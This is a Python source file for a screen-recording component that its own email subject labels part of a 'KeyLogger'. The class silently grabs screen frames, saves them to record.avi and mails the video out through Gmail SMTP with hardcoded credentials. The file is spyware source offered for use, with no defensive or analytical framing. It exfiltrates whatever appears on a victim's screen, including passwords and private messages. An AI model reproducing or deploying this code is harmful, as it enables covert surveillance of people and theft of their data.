import numpy as np
import cv2, time, os, smtplib
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# ===========================================
#   SCREEN RECORDER CLASS RECORDS THE SCREEN
# ===========================================
class Scrn_Recorder:

    # ----------------------------------------------------------------------------
    #   INTITATE THE CONSTRUCTOR FOR EMAIL, PASSWORD, TIME INTERVAL, FRAME/SECOND
    # ----------------------------------------------------------------------------
    def __init__(self, email, password, time_interval, fps):
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.present_time = time.localtime().tm_sec
        self.fourcc = cv2.VideoWriter_fourcc('X', 'V', 'I', 'D')
        self.vid = cv2.VideoWriter('record.avi', self.fourcc, fps, (1280, 720))

    # -------------------------------------------
    #   SEND VIDEO AS A ATTACHMENT TO THE MAIL
    # -------------------------------------------
    def send_mail(self, attach_file):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = 'KeyLogger Screen recorder details'
        body = 'Below file contains the Screen Recording information'
        msg.attach(MIMEText(body, 'plain'))
        filename = os.getcwd().replace('\\', '/') + attach_file
        attachment = open(filename, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', 'attachment; filename=%s' % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(self.email, self.password)
        text = msg.as_string()
        s.sendmail(self.email, self.email, text)
        s.quit()
        print('[+] Mail Sent Successfully')

    # ----------------------------------------------------------------
    #   RECORD THE VIDEO BASED ON TIME INTERVAL SPECIFIED BY THE USER
    # ----------------------------------------------------------------
    def get_record(self):
        while True:
            img = ImageGrab.grab(bbox=(0, 0, 1280, 720))
            img_np = np.array(img)
            frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
            self.vid.write(frame)
            future_time = time.localtime().tm_sec
            if future_time - self.present_time == self.time_interval:
                break
        self.vid.release()
        cv2.destroyAllWindows()
        self.send_mail('/record.avi')
